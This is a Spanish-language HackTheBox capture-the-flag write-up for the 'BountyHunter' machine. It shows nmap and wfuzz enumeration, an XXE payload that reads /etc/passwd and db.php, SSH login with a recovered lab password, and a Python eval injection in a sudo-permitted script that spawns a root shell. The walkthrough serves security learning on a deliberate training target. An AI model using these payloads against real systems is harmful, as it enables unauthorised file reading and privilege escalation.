---
title: HackTheBox - BountyHunter
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'XXE', 'Python Exploitation']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/BountyHunter/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: BountyHunter Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **XXE, Python Exploitation**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos en la **Máquina BountyHunter**

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Machines/BountyHunter/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p22,80 -sCV <IP> -oN versiones`**

    ![](/assets/images/Machines/BountyHunter/02-versions.png)

c. Visitamos el sitio web en busca de más información. En la sección de **Portal** encontramos una sistema de reportes en fase beta

![](/assets/images/Machines/BountyHunter/03-web.png)

* Al enviar un 'reporte' la información será reflejada en la página web

    ![](/assets/images/Machines/BountyHunter/04-web.png)

d. Analizamos como se tramita esta información con **Burp Suite**

![](/assets/images/Machines/BountyHunter/05-burp.png)

* La información se envía en **base64** y luego se la **urlencodea** 

    ![](/assets/images/Machines/BountyHunter/06-xml.png)

    > Información en **formato xml** enviada.

e. Probaremos un **XXE** con el fin de leer archivos del servidor

> Definimos una **entidad externa** la cual nos permitirá leer el fichero **/etc/passwd** en base64 (Para evitar problemas de representación).
{: .prompt-tip }

* Referenciamos la entidad en el campo **title** (En este campo veremos la información solicitada)

    ```xml
    <?xml  version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
        <bugreport>
        <title>&xxe;</title>
        <cwe>test</cwe>
        <cvss>test</cvss>
        <reward>test</reward>
        </bugreport>
    ```

* Decodeamos la información devuelta y podremos ver el fichero **`/etc/passwd`**

    ```bash
    > echo -n 'cm9vdDp4OjA[DATA BASE64]' | base64 -d | grep -E 'bash$'

    root:x:0:0:root:/root:/bin/bash
    development:x:1000:1000:Development:/home/development:/bin/bash
    ```

f. En este caso, no podremos leer la clave privada id_rsa del usuario **development**. Si nos fijamos, la página web admite **php** por lo que para buscar información útil lo que podemos hacer es fuzzear por este tipo de archivos

```bash
> wfuzz -c -t 100 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://<IP BountyHunter>/FUZZ.php

<SNIP>
000000834:   200        0 L      0 W        0 Ch        "db"
```

* Vemos que existen un fichero **db.php**, pero, tiene 0 caracteres. Eso no significa que esté vacío, el código php es interpretado, por lo que no se lo ve, pero si lo llegamos a leer a través del XXE llegaremos a ver la información que este contiene.

    ![](/assets/images/Machines/BountyHunter/07-db.png)

* Obtenemos una contraseña, la cual es válida para el usuario **development** en el servicio SSH

    ```bash
    sshpass -p 'm19RoAU0hP41A1sTsq6K' ssh development@<IP BountyHunter>
    development@bountyhunter:~$
    ```

### Escalada de Privilegios 💹

a. Analizamos nuestros privilegios a nivel de sudoers.

```bash
development@bountyhunter:~$ sudo -l

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

![](/assets/images/Machines/BountyHunter/08-code.png)

* Ejecución de comandos con **eval**: [Code Injection](https://vk9-sec.com/exploiting-python-eval-code-injection/)

* Archivo **`ticket.md`**

    ```md
    # Skytrain Inc
    ## Ticket to /tmp
    __Ticket Code:__
    **39+__import__('os').system('whoami')
    ```

    ![](/assets/images/Machines/BountyHunter/09-code.png)


b. Con lo anterior en mente, podemos spawnear una shell como root

```md
# Skytrain Inc
## Ticket to /tmp
__Ticket Code:__
**39+__import__('os').system('bash')
```

```bash
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
./ticket.md
Destination: /tmp
root@bountyhunter:/home/development#
```